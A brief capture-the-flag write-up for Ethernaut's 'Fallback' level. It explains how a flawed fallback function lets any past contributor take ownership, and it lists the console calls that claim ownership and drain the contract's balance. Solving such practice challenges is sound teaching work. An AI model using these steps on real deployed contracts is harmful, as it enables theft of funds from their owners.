# Level1 - Fallback

- [link to challenge](https://ethernaut.zeppelin.solutions/level/0x234094aac85628444a82dae0396c680974260be7)

# Issue

- From `function contribute() public payable` it appears the contract author intended the owner to be replaced when a contributor, contributes more than the current owner.
- The error is in the the fallback function which will let any sender become owner if the transaction has any ether >= 0 and that the sender has made a contribution in the past.

# Solution

1. Click "Get new instance"
1. Send 1 wei to `function contribute() public payable`: `contract.contribute({ value: 1 })`
1. Send 1 wei to the fallback function: `await contract.sendTransaction({ value: 1 })`
1. Confirm that you are the new owner by running `await contract.owner()`
1. Drain the contract's balance: `contract.withdraw()`
1. Finally, click 'Submit Instance'
